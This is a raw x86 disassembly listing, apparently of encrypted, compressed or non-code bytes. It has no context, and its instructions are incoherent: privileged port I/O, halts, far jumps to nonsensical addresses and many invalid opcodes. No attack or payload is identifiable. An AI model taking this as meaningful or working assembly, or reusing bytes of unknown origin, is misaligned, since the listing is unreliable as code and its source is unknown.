  4111f7:	addr16 mov esi,0xd7b458d7
  4111fd:	mov    ch,0x40
  4111ff:	cmp    esp,DWORD PTR [edx]
  411201:	lea    edi,[ebx+0xbd501c9]
  411207:	pop    ds
  411208:	test   DWORD PTR [eax+0x68],ebp
  41120b:	inc    ebx
  41120c:	test   eax,0x2cb90c11
  411211:	sti    
  411212:	xor    al,0x43
  411214:	mov    BYTE PTR [esi+ebx*2],dh
  411217:	outs   dx,DWORD PTR ds:[esi]
  411218:	push   ebp
  411219:	rcl    BYTE PTR [edi],0x59
  41121c:	lahf   
  41121d:	es ror cl,1
  411220:	fldenv [edx-0x1e]
  411223:	clc    
  411224:	loopne 0x41122d
  411226:	in     al,dx
  411227:	add    DWORD PTR [esi],eax
  411229:	pop    edi
  41122a:	ins    DWORD PTR es:[edi],dx
  41122b:	xor    eax,0xd5367710
  411230:	out    dx,al
  411231:	outs   dx,BYTE PTR ds:[esi]
  411232:	push   ebp
  411233:	adc    al,0xf
  411235:	iret   
  411236:	mov    dl,dh
  411238:	sub    eax,0xcb70aa9e
  41123d:	test   ecx,ecx
  41123f:	out    dx,eax
  411240:	scas   eax,DWORD PTR es:[edi]
  411241:	imul   BYTE PTR [edx-0x36000817]
  411247:	mov    edx,0x6e9a0829
  41124c:	in     al,dx
  41124d:	pop    ebx
  41124e:	pop    ecx
  41124f:	stos   DWORD PTR es:[edi],eax
  411250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411251:	xchg   esi,eax
  411252:	div    DWORD PTR ds:0xee79f4cf
  411258:	xor    DWORD PTR [ebp+esi*4-0x4efb891],edx
  41125f:	dec    eax
  411260:	pop    edx
  411261:	sar    bl,cl
  411263:	xchg   esp,eax
  411264:	add    BYTE PTR [edi],0x5
  411267:	rcl    BYTE PTR [ebx],cl
  411269:	push   ecx
  41126a:	adc    ebx,0xabccb727
  411270:	push   ecx
  411271:	fst    st(7)
  411273:	in     al,dx
  411274:	hlt    
  411275:	shr    BYTE PTR [edi+0x5d],0xdc
  411279:	xor    eax,0x837ca34d
  41127e:	add    ebp,esp
  411280:	loope  0x4112f4
  411282:	pop    esp
  411283:	push   edi
  411284:	jge    0x4112c4
  411286:	fbstp  TBYTE PTR [eax-0x50]
  411289:	sti    
  41128a:	cmp    bh,BYTE PTR [ecx+0x6d]
  41128d:	cld    
  41128e:	xor    edx,DWORD PTR [esi+edx*8]
  411291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411292:	and    bl,BYTE PTR [eax]
  411294:	adc    esp,DWORD PTR [ebx]
  411296:	mov    dh,0xb
  411298:	ss daa 
  41129a:	jno    0x411232
  41129c:	neg    BYTE PTR [eax]
  41129e:	dec    ebx
  41129f:	sbb    ecx,DWORD PTR [ecx+0x5f]
  4112a2:	or     BYTE PTR [ebx+0x4],cl
  4112a5:	mov    eax,0x2d90ad9f
  4112aa:	or     esi,eax
  4112ac:	retf   0x573
  4112af:	xchg   ebp,eax
  4112b0:	out    0x6c,al
  4112b2:	outs   dx,DWORD PTR ds:[esi]
  4112b3:	jbe    0x411314
  4112b5:	cdq    
  4112b6:	mov    al,0x44
  4112b8:	pushf  
  4112b9:	pop    DWORD PTR [edi]
  4112bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112bc:	mov    WORD PTR [ecx-0x43c66319],es
  4112c2:	fstp   TBYTE PTR [edx+0x48]
  4112c5:	jo     0x411327
  4112c7:	addr16 stc 
  4112c9:	xchg   ecx,eax
  4112ca:	lods   eax,DWORD PTR ds:[esi]
  4112cb:	mov    edx,0x50303271
  4112d0:	hlt    
  4112d1:	xchg   esp,eax
  4112d2:	icebp  
  4112d3:	scas   eax,DWORD PTR es:[edi]
  4112d4:	jmp    0xf4ae:0xa50ff0b7
  4112db:	into   
  4112dc:	je     0x411277
  4112de:	popf   
  4112df:	(bad)  
  4112e0:	inc    esp
  4112e1:	pop    ebp
  4112e2:	mov    esi,0x6f683caf
  4112e7:	xor    BYTE PTR [ecx+0x29],ah
  4112ea:	loope  0x4112ba
  4112ec:	cmp    BYTE PTR [ecx+0xe],ch
  4112ef:	retf   0x3021
  4112f2:	cld    
  4112f3:	xchg   esi,eax
  4112f4:	mov    ds:0x9b6915d4,eax
  4112f9:	pop    es
  4112fa:	es xor eax,0xb855b053
  411300:	adc    eax,0xb68ba5c9
  411305:	jle    0x4112b3
  411307:	pop    ebp
  411308:	cld    
  411309:	cli    
  41130a:	or     eax,0x7a956658
  41130f:	or     dl,bh
  411311:	push   ecx
  411312:	ins    BYTE PTR es:[edi],dx
  411313:	hlt    
  411314:	ror    DWORD PTR [ebx],0x7e
  411317:	add    al,0x9a
  411319:	cmp    DWORD PTR [edi-0xc],0x92519808
  411320:	ror    BYTE PTR [edi],cl
  411322:	aad    0x89
  411324:	dec    ecx
  411325:	pop    es
  411326:	and    al,0x51
  411328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411329:	test   al,0xb
  41132b:	gs out 0x5c,eax
  41132e:	stc    
  41132f:	jne    0x4112d7
  411331:	fs jmp 0xe80b:0x9a74fe2d
  411339:	pop    ds
  41133a:	jmp    0x5637:0x6cdb6aba
  411341:	(bad)  
  411342:	sbb    edx,ebp
  411344:	rcr    DWORD PTR [eax+0x37],0xab
  411348:	mov    edx,esi
  41134a:	lea    eax,[ecx+0x66f6ecb9]
  411350:	push   ebx
  411351:	jmp    0xa658e087
  411356:	int3   
  411357:	cmp    BYTE PTR [eax+0x57bb9f24],ah
  41135d:	sbb    cl,BYTE PTR [ebp+0x4360054e]
  411363:	test   al,0x7e
  411365:	mov    bh,0x12
  411367:	cmp    edi,DWORD PTR [edi+0x543c829c]
  41136d:	repnz xor eax,0x6140313
  411373:	repz ret 0x22f0
  411377:	test   DWORD PTR [eax+0x2e416f97],ecx
  41137d:	fisttp DWORD PTR [ebx]
  41137f:	aaa    
  411380:	cld    
  411381:	mov    BYTE PTR [edi],dh
  411383:	aaa    
  411384:	xchg   ecx,eax
  411385:	hlt    
  411386:	mov    ecx,0x1669514f
  41138b:	lods   eax,DWORD PTR ds:[esi]
  41138c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41138d:	xor    DWORD PTR [edx],edi
  41138f:	les    ebp,FWORD PTR [ecx+0x63]
  411392:	mov    eax,ds:0xb4bd49d6
  411397:	cld    
  411398:	fwait
  411399:	mov    edx,0x27f832a7
  41139e:	ficomp WORD PTR [ebp+0x7cb6f4a0]
  4113a4:	rol    BYTE PTR [eax],1
  4113a6:	mov    bl,0x16
  4113a8:	xchg   ecx,eax
  4113a9:	pop    es
  4113aa:	jg     0x411403
  4113ac:	jne    0x411393
  4113ae:	cli    
  4113af:	jbe    0x4113e6
  4113b1:	and    al,0x8c
  4113b3:	adc    BYTE PTR [edi],dh
  4113b5:	idiv   DWORD PTR [eax]
  4113b7:	push   eax
  4113b8:	sub    ax,0xc625
  4113bc:	call   0x62acda5
  4113c1:	repz xchg edx,eax
  4113c3:	aad    0xa8
  4113c5:	add    ah,al
  4113c7:	or     eax,0x9f7be88f
  4113cc:	int3   
  4113cd:	mov    ds:0xd2ffcadf,al
  4113d2:	adc    DWORD PTR [edi+0x51],0x66
  4113d6:	mov    edi,0x1bcdab94
  4113db:	xchg   esp,eax
  4113dc:	mov    WORD PTR [ebx+0x4f],fs
  4113df:	fistp  QWORD PTR [esi-0x5c]
  4113e2:	fsubr  st,st(7)
  4113e4:	cmp    BYTE PTR [esi-0x5b81226a],0xe5
  4113eb:	push   edi
  4113ec:	shl    BYTE PTR [ebx],0x1b
  4113ef:	xchg   esi,eax
  4113f0:	sbb    BYTE PTR [edi],al
  4113f2:	addr16 mov edi,0xbe5e72c8
  4113f8:	rol    edi,0x98
  4113fb:	das    
  4113fc:	pop    esi
  4113fd:	push   edi
  4113fe:	mov    eax,ds:0xe4869569
  411403:	mov    ecx,0x76a86624
  411408:	jns    0x4113dc
  41140a:	dec    edi
  41140b:	inc    edi
  41140c:	add    cl,cl
  41140e:	je     0x41148f
  411410:	or     BYTE PTR ds:0xf4fb2d73,0x1
  411417:	xor    edx,esp
  411419:	push   ecx
  41141a:	sbb    bl,BYTE PTR [esi+0xd09d325]
  411420:	inc    ecx
  411421:	fdiv   QWORD PTR [ebx-0x33728f3c]
  411427:	lahf   
  411428:	add    al,0xd0
  41142a:	or     ebx,DWORD PTR [ebx+0x41cf4adf]
  411430:	adc    al,0x5e
  411432:	out    dx,al
  411433:	dec    esp
  411434:	dec    ebp
  411435:	clc    
  411436:	enter  0x9b3d,0x37
  41143a:	or     al,0x4f
  41143c:	ja     0x411480
  41143e:	shl    DWORD PTR [edx-0x999092b],1
  411444:	mov    ds:0xbd945906,eax
  411449:	cmp    ebx,0xdf012f17
  41144f:	jmp    0x411429
  411451:	xor    al,0x65
  411453:	jmp    0x906605b9
  411458:	in     eax,0xa4
  41145a:	adc    ecx,DWORD PTR [eax]
  41145c:	out    dx,eax
  41145d:	sub    ebp,DWORD PTR [edx-0x511d73e0]
  411463:	sbb    DWORD PTR [ebp+0x37],ebp
  411466:	mov    DWORD PTR [edi-0x23],eax
  411469:	(bad)  
  41146a:	out    dx,eax
  41146b:	add    eax,0xfa172e6f
  411470:	(bad)  
  411471:	xchg   ecx,eax
  411472:	mov    ebp,0x72a73784
  411477:	mov    ebp,0x7c242823
  41147c:	test   DWORD PTR [ecx],edi
  41147e:	icebp  
  41147f:	mov    esp,0x21303a5d
  411484:	and    DWORD PTR [edi-0x7a],eax
  411487:	xor    al,0xa7
  411489:	out    dx,al
  41148a:	jmp    DWORD PTR [edi+0x1cff7aea]
  411490:	scas   al,BYTE PTR es:[edi]
  411491:	fild   QWORD PTR ds:0x6af46e6f
  411497:	sbb    esp,DWORD PTR [ebp+ecx*4-0x59cd7544]
  41149e:	add    BYTE PTR [ebx-0x72],ah
  4114a1:	pop    ss
  4114a2:	sub    eax,0x8d34fbbc
  4114a7:	aad    0xf
  4114a9:	out    dx,eax
  4114aa:	dec    ecx
  4114ab:	dec    esi
  4114ac:	mov    cs,WORD PTR [ebp-0x25ba34a7]
  4114b2:	pop    ebp
  4114b3:	inc    ebp
  4114b4:	jp     0x41147c
  4114b6:	push   esi
  4114b7:	mov    ds:0xc04fec76,al
  4114bc:	adc    eax,0xa1fcf5d4
  4114c1:	jp     0x411511
  4114c3:	pop    edi
  4114c4:	sbb    DWORD PTR [esi+edx*4-0x53347acc],ecx
  4114cb:	mov    esi,0x578990b6
  4114d0:	xchg   BYTE PTR [edi-0x7],dh
  4114d3:	and    dl,BYTE PTR [ebp-0x78]
  4114d6:	xchg   edi,eax
  4114d7:	jle    0x41152c
  4114d9:	test   cl,bl
  4114db:	call   0xe51f912c
  4114e0:	pusha  
  4114e1:	mov    ds:0x24e1f62a,al
  4114e6:	jbe    0x4114de
  4114e8:	aas    
  4114e9:	or     eax,0x3f884bc4
  4114ee:	lea    ebp,[ebx-0x1c48a547]
  4114f4:	cmp    al,0xaa
  4114f6:	dec    ebp
  4114f7:	xor    dl,BYTE PTR [eax+0x4b]
  4114fa:	and    esp,DWORD PTR [ebp+ecx*1-0x2999c740]
  411501:	mov    edx,0xa42022e4
  411506:	mov    ch,0xf
  411508:	dec    esp
  411509:	cs dec esp
  41150b:	adc    cl,BYTE PTR [ebp-0x3410a29f]
  411511:	sub    esi,DWORD PTR [edi+eiz*2+0x17e076bf]
  411518:	jno    0x411563
  41151a:	(bad)  
  41151b:	stc    
  41151c:	stos   DWORD PTR es:[edi],eax
  41151d:	xchg   ecx,eax
  41151e:	(bad)  
  41151f:	int3   
  411520:	loop   0x4114f6
  411522:	aad    0x2d
  411524:	jns    0x4114fd
  411526:	and    eax,0x546e52b0
  41152b:	test   BYTE PTR [ebx+0x54665a9],bh
  411531:	jo     0x411578
  411533:	mov    ecx,0x47973956
  411538:	mov    ebx,0xc250dc81
  41153d:	push   ds
  41153e:	loop   0x411567
  411540:	jo     0x411509
  411542:	xchg   edx,eax
  411543:	sub    cl,ah
  411545:	add    esi,DWORD PTR [eax-0x30]
  411548:	(bad)  
  41154a:	sbb    ebx,edi
  41154c:	pop    esp
  41154d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41154e:	push   ss
  41154f:	inc    eax
  411550:	jge    0x4115a5
  411552:	inc    BYTE PTR [eax+0x33c3d898]
  411558:	dec    ebp
  411559:	cdq    
  41155a:	sahf   
  41155b:	into   
  41155c:	mov    cl,0xc5
  41155e:	xchg   DWORD PTR [esi-0x66],ebx
  411561:	jo     0x411520
  411563:	jae    0x41154b
  411565:	push   ebp
  411566:	cmp    esp,DWORD PTR [edi-0x7c7e1faa]
  41156c:	stos   BYTE PTR es:[edi],al
  41156d:	test   eax,0x3c04df7d
  411572:	shl    DWORD PTR [ebx],0x12
  411575:	test   eax,0x85342f88
  41157a:	adc    eax,0x9410699d
  41157f:	push   eax
  411580:	stos   DWORD PTR es:[edi],eax
  411581:	je     0x411592
  411583:	test   al,0x7f
  411585:	mov    ch,0x51
  411587:	ds ja  0x411607
  41158a:	ins    DWORD PTR es:[edi],dx
  41158b:	push   ds
  41158c:	mov    DWORD PTR [esi+0x6e],eax
  41158f:	cs addr16 pop edx
  411592:	outs   dx,BYTE PTR ds:[esi]
  411593:	out    dx,al
  411594:	out    0x3a,eax
  411596:	in     al,0xfd
  411598:	iret   
  411599:	sub    edx,DWORD PTR [ebx-0x31]
  41159c:	cmp    ch,BYTE PTR [ebx-0x60b11d66]
  4115a2:	push   ds
  4115a3:	adc    BYTE PTR [esi],al
  4115a5:	imul   esi,DWORD PTR [ecx-0x18],0xf9c983fd
  4115ac:	mov    al,0x60
  4115ae:	or     ah,bh
  4115b0:	mov    esp,0x4555fdb
  4115b5:	outs   dx,DWORD PTR ds:[esi]
  4115b6:	and    al,0x86
  4115b8:	mov    dh,dl
  4115ba:	setns  BYTE PTR [edx+edi*4-0x47d1f63d]
  4115c2:	pop    eax
  4115c3:	cmp    eax,0x9c944a7
  4115c8:	mov    cl,0xb7
  4115ca:	lods   eax,DWORD PTR ds:[esi]
  4115cb:	jno    0x411648
  4115cd:	or     eax,0xfb16f0bf
  4115d2:	test   eax,0xa58ca0
  4115d7:	call   0xf0483be3
  4115dc:	mov    edi,0xd1f22600
  4115e1:	jae    0x411656
  4115e3:	dec    esi
  4115e4:	dec    esi
  4115e5:	sbb    ah,ah
  4115e7:	int    0xf4
  4115e9:	imul   esi,DWORD PTR [ebx-0x583391bc],0x8
  4115f0:	ins    DWORD PTR es:[edi],dx
  4115f1:	stos   DWORD PTR es:[edi],eax
  4115f2:	xor    dh,BYTE PTR [ebx]
  4115f4:	lahf   
  4115f5:	outs   dx,DWORD PTR ds:[esi]
  4115f6:	cld    
  4115f7:	adc    dh,bh
  4115f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fa:	leave  
  4115fb:	arpl   WORD PTR cs:[esi-0x5c],sp
  4115ff:	mov    bl,0xc4
  411601:	(bad)  
  411602:	cwde   
  411603:	adc    cl,BYTE PTR [esp+ecx*8-0x5c163e6d]
  41160a:	xchg   edi,eax
  41160b:	popa   
  41160c:	inc    esi
  41160d:	jne    0x4115c1
  41160f:	loope  0x411632
  411611:	daa    
  411612:	ins    DWORD PTR es:[edi],dx
  411613:	rcr    BYTE PTR [edi+0x57],1
  411616:	cmp    ebx,DWORD PTR [edi+0x22]
  411619:	xor    eax,0xe97c8148
  41161e:	jbe    0x4115ca
  411620:	loopne 0x411635
  411622:	mov    ch,0x54
  411624:	xchg   esi,eax
  411625:	inc    ecx
  411626:	fiadd  DWORD PTR [eax]
  411628:	iret   
  411629:	je     0x411613
  41162b:	and    ecx,esp
  41162d:	mov    eax,ds:0xb7bd491a
  411632:	iret   
  411633:	je     0x411676
  411635:	sub    al,0x39
  411637:	and    dh,0xf9
  41163a:	sbb    bl,BYTE PTR [ebx]
  41163c:	rol    BYTE PTR [ebx],1
  41163e:	aas    
  41163f:	add    ebx,esi
  411641:	mov    al,0x35
  411643:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411645:	fisttp QWORD PTR [ecx+0xc57479e]
  41164b:	mov    bh,0x62
  41164d:	inc    ecx
  41164e:	frstor [edx-0x1c453e49]
  411654:	or     BYTE PTR ds:0x6ede508b,ch
  41165a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41165b:	and    ecx,DWORD PTR [ecx-0x64af30c4]
  411661:	jne    0x4116cf
  411663:	(bad)  
  411664:	or     ah,BYTE PTR ss:[ebx+esi*4+0x5c]
  411669:	push   eax
  41166a:	sub    DWORD PTR [ecx+0x1a1c94f3],ebx
  411670:	jle    0x411634
  411672:	les    esp,FWORD PTR [edx+0x14d340be]
  411678:	pcmpgtb mm6,mm3
  41167b:	mov    esi,0x99525f0e
  411680:	mov    bl,0x82
  411682:	repnz (bad) 
  411684:	rol    BYTE PTR [edi+esi*2],0xae
  411688:	inc    edx
  411689:	out    dx,eax
  41168a:	cwde   
  41168b:	pop    edi
  41168c:	pop    ds
  41168d:	cmp    BYTE PTR [ebp+0x20],bh
  411690:	fwait
  411691:	or     BYTE PTR [edi+0x147dec09],ch
  411697:	push   ss
  411698:	dec    esp
  411699:	gs nop
  41169b:	lods   eax,DWORD PTR ds:[esi]
  41169c:	sbb    ebp,DWORD PTR [eax+0x3b]
  41169f:	mov    ds:0xec7fbf8e,eax
  4116a4:	and    edi,DWORD PTR [eax]
  4116a6:	and    cl,BYTE PTR [esi]
  4116a8:	cs (bad) 
  4116aa:	sbb    al,0x63
  4116ac:	xchg   BYTE PTR [ecx],dl
  4116ae:	pop    sp
  4116b0:	jno    0x411723
  4116b2:	mov    cl,0xd3
  4116b4:	add    DWORD PTR [ecx-0x3df379f2],edx
  4116ba:	add    BYTE PTR [edx],ah
  4116bc:	and    eax,0xddd0f6f4
  4116c1:	not    DWORD PTR [ebp+eax*4+0x255d4346]
  4116c8:	add    DWORD PTR [esi-0x7a5b2230],0xffffffbc
  4116cf:	popa   
  4116d0:	push   ds
  4116d1:	adc    cl,BYTE PTR [edi+0x71cb53d0]
  4116d7:	pop    ebx
  4116d8:	push   esp
  4116d9:	xchg   esp,eax
  4116da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116db:	mov    ebx,0x8ced1712
  4116e0:	push   ds
  4116e1:	stos   BYTE PTR es:[edi],al
  4116e2:	imul   eax,DWORD PTR [ebx+0x6c],0x691fcc3e
  4116e9:	mov    cl,0xd8
  4116eb:	addr16 fwait
  4116ed:	or     esi,DWORD PTR [ebp-0x7fa7da3b]
  4116f3:	clc    
  4116f4:	loopne 0x4116b8
  4116f6:	jg     0x4116f9
  4116f8:	arpl   di,si
  4116fa:	fwait
  4116fb:	jne    0x411751
  4116fd:	push   esp
  4116fe:	sub    edi,DWORD PTR ds:0x6be76f30
  411704:	mov    DWORD PTR [ecx-0xf71f413],esp
  41170a:	jmp    0xcb2af2a5
  41170f:	stos   DWORD PTR es:[edi],eax
  411710:	ret    
  411711:	into   
  411712:	fs inc ebp
  411714:	ins    BYTE PTR es:[edi],dx
  411715:	sub    DWORD PTR [edi],ecx
  411717:	xor    DWORD PTR [ebx+0x73878aa7],edx
  41171d:	adc    BYTE PTR [eax+0x57],cl
  411720:	mov    bh,0xf1
  411722:	mov    cl,0x85
  411724:	ins    DWORD PTR es:[edi],dx
  411725:	xchg   edi,eax
  411726:	dec    ecx
  411727:	mov    ch,0xb0
  411729:	mov    cl,0xc
  41172b:	out    0xe3,eax
  41172d:	push   ebp
  41172e:	xchg   esi,eax
  41172f:	xchg   DWORD PTR [ecx-0x39],ecx
  411732:	mov    cl,0xdf
  411734:	cli    
  411735:	aaa    
  411736:	jbe    0x411744
  411738:	add    bl,BYTE PTR [ebx+0x16]
  41173b:	push   ebx
  41173c:	pop    ss
  41173d:	add    BYTE PTR [edi-0x22],cl
  411740:	add    DWORD PTR [ebp+0x5f],ebp
  411743:	fwait
  411744:	out    dx,eax
  411745:	dec    esi
  411746:	mov    ebx,0x8c536548
  41174b:	out    dx,al
  41174c:	pop    ecx
  41174d:	or     ch,BYTE PTR [eax]
  41174f:	out    0xfc,eax
  411751:	pushf  
  411752:	inc    esi
  411753:	mov    ebp,0x2bcf2ba1
  411758:	xchg   edx,eax
  411759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175a:	iret   
  41175b:	ficomp DWORD PTR [ecx+esi*4-0x44]
  41175f:	mov    ebp,0x87c95ced
  411764:	mov    ch,0x94
  411766:	add    eax,0xa85b43fd
  41176b:	pop    ebp
  41176c:	test   edx,ebp
  41176e:	push   0x1fef6acc
  411773:	clc    
  411774:	mov    eax,ds:0xcb2e8bf9
  411779:	out    0x67,al
  41177b:	fisubr DWORD PTR [esi+0x29d63e3d]
  411781:	inc    eax
  411782:	scas   al,BYTE PTR es:[edi]
  411783:	adc    ecx,DWORD PTR ds:[esi+0x262ebd23]
  41178a:	icebp  
  41178b:	or     eax,0x1f40448
  411790:	call   DWORD PTR [esi+eiz*2+0x5ed033bd]
  411797:	dec    edi
  411798:	sub    ch,bl
  41179a:	mov    esp,0xa55d0a23
  41179f:	ins    BYTE PTR es:[edi],dx
  4117a0:	or     eax,0x2e2a2dea
  4117a5:	xchg   ebx,eax
  4117a6:	sub    dh,cl
  4117a8:	stos   DWORD PTR es:[edi],eax
  4117a9:	test   DWORD PTR [edi+0x6f],0xb3182fbe
  4117b0:	adc    al,0x9d
  4117b2:	jnp    0x411746
  4117b4:	mov    WORD PTR [esi],cs
  4117b6:	jo     0x4117aa
  4117b8:	outs   dx,DWORD PTR ds:[esi]
  4117b9:	dec    edx
  4117ba:	cmp    DWORD PTR [ebp+0x1e1fef89],0x41338b05
  4117c4:	scas   al,BYTE PTR es:[edi]
  4117c5:	mov    ah,0x3c
  4117c7:	aaa    
  4117c8:	popf   
  4117c9:	push   ebx
  4117ca:	sbb    edx,DWORD PTR [eiz*4-0x3db44c7d]
  4117d1:	out    dx,al
  4117d2:	xor    ah,BYTE PTR [edx+0x7a]
  4117d5:	pop    es
  4117d6:	mov    eax,ds:0x17db39b8
  4117db:	mov    ecx,0xe6fc7aa6
  4117e0:	mov    eax,ds:0xa43b8014
  4117e5:	ins    DWORD PTR es:[edi],dx
  4117e6:	lock pop ss
  4117e8:	xchg   ebp,eax
  4117e9:	dec    edx
  4117eb:	push   ebp
  4117ec:	pop    ecx
  4117ed:	ret    
  4117ee:	scas   al,BYTE PTR es:[edi]
  4117ef:	mov    esi,0xa451cf27
  4117f4:	pop    es
  4117f5:	es mov esi,0xc8addeed
  4117fc:	in     eax,0xaf
  4117fe:	out    dx,eax
  4117ff:	jl     0x4117d5
  411801:	(bad)  
  411802:	pusha  
  411803:	sbb    al,BYTE PTR [edx]
  411805:	imul   edi,DWORD PTR [edx-0x6a86c977],0xf8f8ed27
  41180f:	pop    es
  411810:	dec    esi
  411811:	mov    BYTE PTR [eax+0x41],ch
  411814:	jg     0x411814
  411816:	mov    cl,0x8d
  411818:	call   0x9eee4352
  41181d:	or     al,0xe3
  41181f:	xor    DWORD PTR [ebx-0xe48a529],ecx
  411825:	jno    0x411850
  411827:	push   edi
  411828:	pinsrw mm1,WORD PTR [esi+0x68],0x1c
  41182d:	clc    
  41182e:	add    BYTE PTR gs:[edi+0x44],cl
  411832:	adc    BYTE PTR [edi+0x33052c71],al
  411838:	call   0x2693b46b
  41183d:	ins    DWORD PTR es:[edi],dx
  41183e:	cwde   
  41183f:	ret    
  411840:	push   ebp
  411841:	pop    esp
  411842:	jg     0x41186d
  411844:	rcr    esi,1
  411846:	cmp    eax,0xc730d2dd
  41184b:	repz mov ebx,0xf14e01c1
  411851:	ret    0x4e31
  411854:	dec    ebp
  411855:	mov    DWORD PTR [edi+0x26ffb29],ebx
  41185b:	jo     0x4118c8
  41185d:	out    dx,al
  41185e:	push   ss
  41185f:	add    ecx,esi
  411861:	xchg   ebx,eax
  411862:	mov    ebp,0x57cc8ae7
  411867:	pushf  
  411868:	cmp    bh,BYTE PTR [edx+0x189e816a]
  41186e:	lock fs pusha 
  411871:	stc    
  411872:	jbe    0x4118a8
  411874:	jns    0x4118d3
  411876:	cmc    
  411877:	scas   al,BYTE PTR es:[edi]
  411878:	mov    cs,WORD PTR [eax+0xe]
  41187b:	mov    edi,0x9352e56
  411880:	out    dx,al
  411881:	and    ebp,esp
  411883:	pop    ebp
  411884:	clc    
  411885:	jnp    0x4118ac
  411887:	dec    edi
  411888:	push   ebx
  411889:	ror    BYTE PTR [esp+ebp*4],cl
  41188c:	das    
  41188d:	repnz mov edi,0xc7ec4c90
  411893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411894:	pop    ss
  411895:	int3   
  411896:	push   ebx
  411897:	xchg   ebp,eax
  411898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411899:	lea    ebp,[ebx-0x72]
  41189c:	add    ecx,DWORD PTR [eax]
  41189e:	mov    bl,0x28
  4118a0:	inc    esp
  4118a1:	dec    edx
  4118a2:	jge    0x411915
  4118a4:	cli    
  4118a5:	inc    edi
  4118a6:	jo     0x4118be
  4118a8:	mov    esi,0x30874837
  4118ad:	pop    edi
  4118ae:	aas    
  4118af:	pop    edi
  4118b0:	mov    bl,0x38
  4118b2:	ja     0x4118d7
  4118b4:	mov    al,0x43
  4118b6:	clc    
  4118b7:	xor    BYTE PTR [ebp+0x1febe622],ah
  4118bd:	inc    edi
  4118be:	mov    cl,al
  4118c0:	fld    TBYTE PTR [eax+0x501ea0b2]
  4118c6:	xchg   ecx,eax
  4118c7:	(bad)  
  4118c8:	retf   
  4118c9:	lock sbb eax,0x946225ff
  4118cf:	std    
  4118d0:	les    edx,FWORD PTR [edx+edx*4]
  4118d3:	div    BYTE PTR [edx-0x6d]
  4118d6:	sti    
  4118d7:	pop    es
  4118d8:	mov    ebp,0xc777af47
  4118dd:	ret    0xfe45
  4118e0:	fld    DWORD PTR [esp+ebx*1-0x7e7f1834]
  4118e7:	mov    bl,0x1a
  4118e9:	(bad)  
  4118ea:	jne    0x4118f8
  4118ec:	call   0xb01a:0x54efff09
  4118f3:	and    al,0x33
  4118f5:	xchg   edx,eax
  4118f6:	loope  0x411925
  4118f8:	ret    0xe395
  4118fb:	lahf   
  4118fc:	inc    eax
  4118fd:	xor    esi,DWORD PTR [eax+0x323af378]
  411903:	sbb    eax,0x7ab452a7
  411908:	int3   
  411909:	mov    ecx,0xce6868bc
  41190e:	pushf  
  41190f:	xchg   ebx,eax
  411910:	lds    esi,FWORD PTR ds:0x69336128
  411916:	inc    ebp
  411917:	jbe    0x4118a4
  411919:	add    eax,0x64eba913
  41191e:	rcr    ebp,cl
  411920:	loopne 0x411923
  411922:	sub    al,0x3a
  411924:	inc    esp
  411925:	fnstsw WORD PTR [ebp+0x15]
  411928:	cdq    
  411929:	adc    al,bh
  41192b:	inc    edi
  41192c:	inc    ecx
  41192d:	and    eax,0x19a3a486
  411932:	cld    
  411933:	inc    edi
  411934:	ret    0x2192
  411937:	jmp    0xd21d7fd0
  41193c:	jp     0x4119bb
  41193e:	dec    esi
  41193f:	xor    al,0xc6
  411941:	push   edi
  411942:	jg     0x4118d0
  411944:	jmp    0x3ed8da91
  411949:	mov    es,WORD PTR [ebx-0x6d]
  41194c:	(bad)  
  41194d:	stos   BYTE PTR es:[edi],al
  41194e:	or     eax,0xaa1e4602
  411953:	pop    ebx
  411954:	or     DWORD PTR [edi+ebp*1+0x6f7aa77e],0xffffffc2
  41195c:	aas    
  41195d:	xchg   ecx,eax
  41195e:	pop    esp
  41195f:	sbb    ah,al
  411961:	sbb    ecx,DWORD PTR [esi+0x76b7e711]
  411967:	mov    eax,0x4e2034a7
  41196c:	jmp    0x411946
  41196e:	add    al,0x32
  411970:	dec    edi
  411971:	pop    edi
  411972:	push   ecx
  411973:	sbb    ecx,esp
  411975:	add    BYTE PTR [ebx-0x6299f7ff],dh
  41197b:	sub    eax,DWORD PTR [esi]
  41197d:	and    ecx,edx
  41197f:	or     esi,edi
  411981:	cmp    al,0x8b
  411983:	mov    esp,0x485cce4e
  411988:	shl    DWORD PTR [edx-0x65987b2a],0x42
  41198f:	sbb    al,dh
  411991:	loop   0x4119d5
  411993:	jns    0x4119bf
  411995:	and    ecx,DWORD PTR [esi]
  411997:	fisub  WORD PTR [eax]
  411999:	ja     0x4119f1
  41199b:	jp     0x411955
  41199d:	and    ch,dh
  41199f:	adc    eax,0x47a30e54
  4119a4:	pop    edx
  4119a5:	mov    esi,esi
  4119a7:	fcomp  QWORD PTR [ebp+0x51]
  4119aa:	(bad)  
  4119ab:	xor    al,0x3b
  4119ad:	mov    cl,0x26
  4119af:	push   cs
  4119b0:	nop
  4119b1:	scas   al,BYTE PTR es:[edi]
  4119b2:	inc    ebp
  4119b3:	inc    edx
  4119b4:	sbb    eax,DWORD PTR [ecx+0x50]
  4119b7:	lahf   
  4119b8:	cmc    
  4119b9:	push   edx
  4119ba:	pop    ss
  4119bb:	push   ecx
  4119bc:	add    DWORD PTR [ebp+0x42],ebp
  4119bf:	into   
  4119c0:	rol    edi,1
  4119c2:	add    al,0xb2
  4119c5:	adc    eax,0x90301cc6
  4119ca:	xor    ah,BYTE PTR [ecx]
  4119cc:	repz loope 0x4119e9
  4119cf:	cmp    ah,BYTE PTR [edi]
  4119d1:	mov    ecx,0xe989e312
  4119d6:	cmp    eax,0xf3c8efae
  4119db:	(bad)  
  4119dc:	sbb    DWORD PTR [ecx],eax
  4119de:	shr    BYTE PTR [eax+0x3e20fd57],cl
  4119e4:	adc    dl,BYTE PTR ds:0x6a0f07b1
  4119ea:	add    ebx,DWORD PTR [ebx+0x43]
  4119ed:	xchg   ebx,ecx
